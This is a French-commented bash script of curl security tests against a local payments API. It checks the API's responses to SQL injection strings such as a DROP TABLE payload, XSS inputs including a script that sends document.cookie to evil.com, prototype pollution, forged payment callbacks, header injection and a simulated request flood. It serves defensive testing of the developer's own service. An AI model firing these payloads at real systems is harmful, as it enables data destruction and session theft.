#!/bin/bash

# ========================================
# TESTS CURL SÉCURITÉ & VALIDATION - PAIEMENTS
# ========================================
# Tests de sécurité, validation et gestion d'erreurs

API_BASE="http://localhost:3000"
API_PAYMENTS="${API_BASE}/api/payments"

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log_security() {
    echo -e "${PURPLE}🔒 $1${NC}"
}

log_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

log_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

log_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

log_error() {
    echo -e "${RED}❌ $1${NC}"
}

test_security() {
    local response="$1"
    local expected_status="$2"
    local test_name="$3"
    
    echo "----------------------------------------"
    log_security "SECURITY TEST: $test_name"
    
    status_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n -1)
    
    echo "Status Code: $status_code"
    echo "Response:"
    echo "$body" | jq '.' 2>/dev/null || echo "$body"
    
    if [ "$status_code" -eq "$expected_status" ]; then
        log_success "Sécurité OK - Status $status_code"
    else
        log_error "Problème sécurité - Attendu $expected_status, reçu $status_code"
    fi
    echo ""
}

echo "========================================"
echo "🔒 TESTS SÉCURITÉ - MODULE PAIEMENTS"
echo "========================================"

# ========================================
# 1. TESTS D'INJECTION SQL
# ========================================
log_security "SECTION 1: Tests d'injection SQL"

# Test injection SQL dans ord_cst_id
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": "1; DROP TABLE ___xtr_order; --",
        "ord_total_ttc": "100.00",
        "payment_gateway": "STRIPE"
    }' \
    "$API_PAYMENTS")
test_security "$response" 400 "Injection SQL dans ord_cst_id"

# Test injection SQL dans endpoint
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    "$API_PAYMENTS/1%27%20OR%201%3D1%20--%20/status")
test_security "$response" 400 "Injection SQL dans URL"

# ========================================
# 2. TESTS XSS ET SCRIPTS
# ========================================
log_security "SECTION 2: Tests XSS et scripts malveillants"

# Test XSS dans metadata
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": "81500",
        "ord_total_ttc": "50.00",
        "payment_gateway": "STRIPE",
        "payment_metadata": {
            "description": "<script>alert(\"XSS\")</script>",
            "malicious": "</script><script>fetch(\"http://evil.com/steal?data=\"+document.cookie)</script>"
        }
    }' \
    "$API_PAYMENTS")
test_security "$response" 201 "XSS dans metadata (doit être échappé)"

# Test XSS dans URL callbacks
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": "81500",
        "ord_total_ttc": "25.00",
        "payment_gateway": "CYBERPLUS",
        "return_url": "javascript:alert(\"XSS\")",
        "callback_url": "http://evil.com/callback?steal=<script>alert(1)</script>"
    }' \
    "$API_PAYMENTS")
test_security "$response" 400 "URLs malveillantes dans callbacks"

# ========================================
# 3. TESTS DE DÉPASSEMENT DE LIMITES
# ========================================
log_security "SECTION 3: Tests de dépassement de limites"

# Test avec payload très volumineux
LARGE_PAYLOAD='{"ord_cst_id":"81500","ord_total_ttc":"100.00","payment_gateway":"STRIPE","payment_metadata":{"large_field":"'
for i in {1..1000}; do
    LARGE_PAYLOAD+="A"
done
LARGE_PAYLOAD+='"}}'

response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d "$LARGE_PAYLOAD" \
    "$API_PAYMENTS")
test_security "$response" 400 "Payload volumineux (doit être limité)"

# Test avec montant excessivement élevé
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": "81500",
        "ord_total_ttc": "99999999999999.99",
        "payment_gateway": "STRIPE"
    }' \
    "$API_PAYMENTS")
test_security "$response" 400 "Montant excessif"

# ========================================
# 4. TESTS DE VALIDATION STRICTE
# ========================================
log_security "SECTION 4: Tests de validation des données"

# Test avec types de données incorrects
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": 123456,
        "ord_total_ttc": "not_a_number",
        "payment_gateway": 12345
    }' \
    "$API_PAYMENTS")
test_security "$response" 400 "Types de données incorrects"

# Test avec champs supplémentaires malveillants
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "ord_cst_id": "81500",
        "ord_total_ttc": "100.00",
        "payment_gateway": "STRIPE",
        "__proto__": {"isAdmin": true},
        "constructor": {"prototype": {"isAdmin": true}},
        "admin": true,
        "password": "hack123"
    }' \
    "$API_PAYMENTS")
test_security "$response" 201 "Pollution de prototype (doit être ignorée)"

# ========================================
# 5. TESTS DE MANIPULATION D'IDENTIFIANTS
# ========================================
log_security "SECTION 5: Tests de manipulation d'identifiants"

# Test avec ID négatif
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    "$API_PAYMENTS/-1/status")
test_security "$response" 400 "ID négatif"

# Test avec ID non numérique
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    "$API_PAYMENTS/abc123/status")
test_security "$response" 400 "ID non numérique"

# Test avec ID très long
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    "$API_PAYMENTS/123456789012345678901234567890/status")
test_security "$response" 400 "ID excessivement long"

# ========================================
# 6. TESTS D'ATTAQUES DDOS SIMULÉES
# ========================================
log_security "SECTION 6: Tests de limitation de taux (DDoS)"

log_info "Test de 20 requêtes rapides..."
start_time=$(date +%s)
for i in {1..20}; do
    curl -s "$API_PAYMENTS/stats" > /dev/null
done
end_time=$(date +%s)
duration=$((end_time - start_time))

if [ $duration -lt 2 ]; then
    log_warning "Pas de limitation de taux détectée (durée: ${duration}s)"
else
    log_success "Limitation de taux possible (durée: ${duration}s)"
fi

# ========================================
# 7. TESTS DE HEADERS MALVEILLANTS
# ========================================
log_security "SECTION 7: Tests de headers malveillants"

# Test avec headers d'injection
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 127.0.0.1, <script>alert('xss')</script>" \
    -H "X-Real-IP: 192.168.1.1; DROP TABLE users;" \
    -H "User-Agent: Mozilla/5.0 <script>alert(1)</script>" \
    "$API_PAYMENTS/stats")
test_security "$response" 200 "Headers avec contenu malveillant"

# Test avec encoding malveillant
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json; charset=utf-7" \
    -H "Content-Encoding: +ADw-script+AD4-alert(1)+ADw-/script+AD4-" \
    "$API_PAYMENTS/stats")
test_security "$response" 200 "Encoding malveillant"

# ========================================
# 8. TESTS DE CALLBACK SÉCURISÉS
# ========================================
log_security "SECTION 8: Tests de sécurité des callbacks"

# Test callback avec signature invalide
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Signature: invalid_signature" \
    -d '{
        "transactionId": "fake_txn_123",
        "orderId": "999999",
        "amount": "1000000.00",
        "currency": "EUR",
        "status": "SUCCESS"
    }' \
    "$API_PAYMENTS/callback/stripe")
test_security "$response" 200 "Callback avec signature invalide"

# Test callback avec montant modifié
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{
        "transactionId": "tampered_txn",
        "orderId": "280001",
        "amount": "99999.99",
        "currency": "USD",
        "status": "SUCCESS",
        "gateway_response": {
            "original_amount": "17.49"
        }
    }' \
    "$API_PAYMENTS/callback/cyberplus")
test_security "$response" 200 "Callback avec montant modifié"

# ========================================
# 9. TESTS D'EXPOSITION D'INFORMATIONS
# ========================================
log_security "SECTION 9: Tests d'exposition d'informations"

# Test pour vérifier qu'aucune info sensible n'est exposée
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    "$API_PAYMENTS/280001/status")

body=$(echo "$response" | head -n -1)
log_info "Vérification de l'exposition d'informations sensibles..."

# Vérifier qu'aucun mot-clé sensible n'est présent
sensitive_keywords=("password" "secret" "key" "token" "credential" "private")
for keyword in "${sensitive_keywords[@]}"; do
    if echo "$body" | grep -qi "$keyword"; then
        log_error "Information sensible potentielle détectée: $keyword"
    else
        log_success "Pas d'exposition de: $keyword"
    fi
done

# ========================================
# 10. TESTS DE CONTOURNEMENT D'AUTHENTIFICATION
# ========================================
log_security "SECTION 10: Tests de contournement d'auth"

# Test sans headers d'authentification sur endpoints sensibles
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"admin": true, "bypass": true}' \
    "$API_PAYMENTS/admin/reset")
test_security "$response" 404 "Accès endpoint admin sans auth"

# Test avec token falsifié
response=$(curl -s -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer fake_token_123" \
    "$API_PAYMENTS/stats")
test_security "$response" 200 "Token falsifié (endpoints publics)"

echo ""
echo "========================================"
log_success "TESTS DE SÉCURITÉ TERMINÉS !"
echo "========================================"
log_security "🛡️  Résumé des tests de sécurité effectués:"
log_info "   ✓ Injection SQL"
log_info "   ✓ XSS et scripts malveillants"
log_info "   ✓ Dépassement de limites"
log_info "   ✓ Validation stricte des données"
log_info "   ✓ Manipulation d'identifiants"
log_info "   ✓ Attaques DDoS simulées"
log_info "   ✓ Headers malveillants"
log_info "   ✓ Sécurité des callbacks"
log_info "   ✓ Exposition d'informations"
log_info "   ✓ Contournement d'authentification"
echo "========================================"
log_warning "⚠️  Vérifiez tous les logs pour identifier les problèmes potentiels"
log_info "💡 Implémentez les protections nécessaires basées sur ces tests"
echo "========================================"
